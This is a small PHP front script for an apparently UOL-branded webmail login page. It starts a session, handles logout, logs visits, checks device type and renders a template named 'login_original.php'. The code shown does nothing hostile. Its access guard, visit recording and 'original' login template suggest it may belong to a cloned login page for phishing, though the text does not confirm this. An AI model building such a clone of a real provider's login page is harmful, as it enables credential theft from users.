<?php
declare(strict_types=1);

require __DIR__ . '/includes/security.php';

$config = require __DIR__ . '/config.php';
public_session_start($config);

require __DIR__ . '/includes/storage.php';
require __DIR__ . '/includes/access_guard.php';
require __DIR__ . '/includes/messages.php';
require __DIR__ . '/includes/uol_verify.php';
require_once __DIR__ . '/includes/device.php';

enforce_public_access($config);
(new Storage($config['data_dir']))->recordVisit();

$sessionKey = (string) ($config['session_key'] ?? 'webmail_user');

$isLogout = isset($_GET['logout']);
if ($isLogout) {
    unset($_SESSION[$sessionKey]);
    session_regenerate_id(true);
}

$statusMessage = $isLogout ? uol_msg('logged_out') : '';
$statusVisible = $isLogout;
$loginAction = (string) ($config['login_action'] ?? '/login.php');
$isMobile = wm_is_mobile_client();

require __DIR__ . '/templates/login_original.php';
